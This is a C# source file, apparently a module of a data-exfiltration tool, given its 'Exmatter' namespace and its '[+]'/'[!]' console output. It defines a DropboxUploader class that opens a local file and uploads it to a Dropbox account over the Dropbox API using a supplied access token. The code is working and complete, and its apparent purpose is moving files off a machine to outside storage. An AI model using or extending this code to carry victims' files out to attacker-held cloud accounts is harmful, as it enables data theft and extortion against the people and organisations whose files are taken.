using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.Http.Headers;
using System.Net.Http;
using System.Net;
using System.Text;
using System.Threading.Tasks;

namespace Exmatter
{
    public class DropboxUploader
    {
        private readonly string _accessToken;
        private readonly HttpClient _httpClient;

        public DropboxUploader(string accessToken)
        {
            _accessToken = accessToken;
            _httpClient = new HttpClient();
            _httpClient.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Bearer", accessToken);
        }

        public async Task UploadFileAsync(string filePath)
        {
            try
            {
                var fileStream = File.Open(filePath, FileMode.Open);
                var content = new StreamContent(fileStream);
                content.Headers.ContentType = new MediaTypeHeaderValue("application/octet-stream");

                var uri = new Uri($"https://content.dropboxapi.com/2/files/upload");

                var request = new HttpRequestMessage(HttpMethod.Post, uri);

                request.Headers.Add("Authorization", $"Bearer {_accessToken}");
                request.Headers.Add("Dropbox-API-Arg", "{\"path\": \"/" + Path.GetFileName(filePath) + "\",\"mode\": \"add\",\"autorename\": false,\"mute\": false,\"strict_conflict\":false}");


                request.Content = content;

                ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;

                var response = await _httpClient.SendAsync(request);
                if (response.IsSuccessStatusCode)
                {
                    Console.WriteLine($"[+] File uploaded successfully \"{filePath}\"");
                }
                else
                {
                    var error = await response.Content.ReadAsStringAsync();
                    Console.WriteLine($"[!] Error: {response.StatusCode} - {error}");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Error: {ex.Message}");
                Console.WriteLine($"[!] .NET DEBUG Error: {ex}");
            }
        }
    }
}
